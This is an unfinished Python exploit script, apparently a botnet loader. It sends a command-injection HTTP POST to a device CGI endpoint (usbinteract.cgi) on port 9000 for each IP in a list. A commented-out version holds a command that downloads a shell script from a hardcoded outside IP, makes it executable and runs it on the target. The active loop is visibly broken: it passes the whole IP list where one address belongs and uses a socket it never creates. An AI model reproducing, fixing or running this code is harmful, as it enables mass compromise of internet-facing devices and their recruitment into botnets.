#unfinished, only allowing input of ip rn.
# need to finish: make program read ip list. - ez
#need to edit payload to match arguments.
# import sys, socket
#b4ckdoorarchive.host | b4ckdoor.
# if len(sys.argv) < 2:
#     print('Usage: enshare.py <listname>\n')
#     quit()
 
# ip = (sys.argv[1])
# port = 9000
# cmd = "wget http://142.93.192.242/bins.sh; chmod 777 *; ./bins.sh" 


# payload  = 'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\n'
# payload += 'Host: {0}:{1}\r\n'
# payload += 'Content-Length: {2}\r\n'
# payload += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
# payload += 'action=7&path=\"|%s||\"' % cmd
 
# msg = payload.format( ip, port, len(cmd)+19, cmd )
   
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# target = (ip, port)
# print >>sys.stderr, '\nConnecting to %s port %s\n'% target
# s.connect(target)
# s.sendall(msg)
# response = s.recv(5000)
# s.close()
 
# print(response.strip())

import sys
import threading
import requests
import os
from threading import Thread
import socket

ips = open(sys.argv[1], "r").readlines()
cmd = "command to execute here"
port = 9000
payload  = 'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\n'
payload += 'Host: {0}:{1}\r\n'
payload += 'Content-Length: {2}\r\n'
payload += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
payload += 'action=7&path=\"|%s||\"' % cmd

for line in ips:
	msg = payload.format(ips, port, len(cmd)+19, cmd )
	print(ips)
	s.connect(ips, port)
	s.sendall(msg)
	response = s.recv(5000)
	s.close()